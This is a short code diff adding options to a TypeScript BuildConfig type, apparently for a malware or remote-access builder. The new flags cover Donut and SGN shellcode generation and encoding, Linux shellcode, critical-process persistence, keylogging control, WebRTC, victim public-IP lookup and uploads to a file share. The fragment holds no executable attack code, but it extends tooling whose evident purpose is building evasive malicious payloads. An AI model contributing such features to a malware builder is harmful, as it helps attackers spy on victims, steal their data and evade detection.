@@ -42,4 +42,14 @@ export type BuildConfig = {
   solAddress?: string;
   solRpcEndpoints?: string;
   iosBundleId?: string;
+  useDonut?: boolean;
+  useLinuxShellcode?: boolean;
+  shellcodeConsole?: boolean;
+  useSgn?: boolean;
+  sgnIterations?: number;
+  criticalProcess?: boolean;
+  disableKeylogger?: boolean;
+  enableWebrtc?: boolean;
+  fetchPublicIP?: boolean;
+  uploadToFileShare?: boolean;
 };
